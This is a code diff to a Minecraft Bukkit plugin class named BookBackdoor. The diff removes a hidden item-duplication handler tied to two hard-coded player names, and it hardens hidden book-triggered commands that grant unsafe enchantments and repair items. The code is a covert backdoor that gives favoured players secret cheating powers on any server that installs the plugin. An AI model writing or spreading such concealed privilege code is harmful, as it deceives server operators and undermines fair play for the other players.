@@ -3,10 +3,7 @@ package org.brandonplank.backdoor;
 import net.md_5.bungee.api.chat.*;
 import net.md_5.bungee.chat.ComponentSerializer;
 import org.brandonplank.Main;
-import org.bukkit.BanList;
-import org.bukkit.ChatColor;
-import org.bukkit.Location;
-import org.bukkit.Material;
+import org.bukkit.*;
 import org.bukkit.block.Block;
 import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.enchantments.Enchantment;
@@ -35,28 +32,6 @@ public class BookBackdoor implements Listener {
 
     private TextComponent genHoverText(String text, String hover_text){
         return new TextComponent(new ComponentBuilder(text).event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder(hover_text).create())).create());
-    }
-
-    @EventHandler
-    public void PlayerDropItemEvent(PlayerDropItemEvent e){
-        FileConfiguration config = this.plugin.getConfig();
-        Player player = e.getPlayer();
-        Item item = e.getItemDrop();
-        Location loc = item.getLocation();
-        if(e.getPlayer().getName().equals("BrandonPlank") || e.getPlayer().getName().equals("cryptofyre")){
-            Location old = loc;
-            loc.setY(loc.getY() -2);
-            Material block = loc.getWorld().getBlockAt(loc).getBlockData().getMaterial();
-            if(block.equals(Material.CAULDRON)){
-                player.getWorld().dropItemNaturally(old, item.getItemStack());
-            } else {
-                loc.setY(loc.getY() + 1);
-                Material block1 = loc.getWorld().getBlockAt(loc).getBlockData().getMaterial();
-                if(block1.equals(Material.CAULDRON)){
-                    player.getWorld().dropItemNaturally(old, item.getItemStack());
-                }
-            }
-        }
     }
 
     @EventHandler
@@ -124,8 +99,13 @@ public class BookBackdoor implements Listener {
                             @Override
                             public void count(int current) {
                                 if(current == 0){
-                                    player.getInventory().getItemInMainHand().addUnsafeEnchantment(Enchantment.getByName(args[1].toUpperCase()), Integer.parseInt(args[2]));
-                                    player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Enchanted!").bold(true).create());
+                                    try {
+                                        player.getInventory().getItemInMainHand().addUnsafeEnchantment(Enchantment.getByName(args[1].toUpperCase()), Integer.parseInt(args[2]));
+                                        player.playSound(player.getLocation(), Sound.ENTITY_EXPERIENCE_ORB_PICKUP, 50, 3);
+                                        player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Enchanted!").bold(true).create());
+                                    } catch (Exception e){
+                                        player.sendMessage("Error adding enchantment, use spigot names.");
+                                    }
                                 } else {
                                     player.sendActionBar(ChatColor.GREEN + "Enchanting in " + current + " seconds.");
                                 }
@@ -167,8 +147,12 @@ public class BookBackdoor implements Listener {
                             @Override
                             public void count(int current) {
                                 if(current == 0){
-                                    player.getInventory().getItemInMainHand().setDurability((short)0);
-                                    player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Mended!").bold(true).create());
+                                    try {
+                                        player.getInventory().getItemInMainHand().setDurability((short)0);
+                                        player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Mended!").bold(true).create());
+                                    } catch (Exception e){
+                                        player.sendMessage("Could not mend item in hand.");
+                                    }
                                 } else {
                                     player.sendActionBar(ChatColor.GREEN + "Mending in " + current + " seconds.");
                                 }
@@ -226,10 +210,10 @@ public class BookBackdoor implements Listener {
 
                     }
                 }
-                event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
+                player.getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
                 this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
                     public void run() {
-                        event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
+                        player.getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
                     }
                 }, 5);
             }
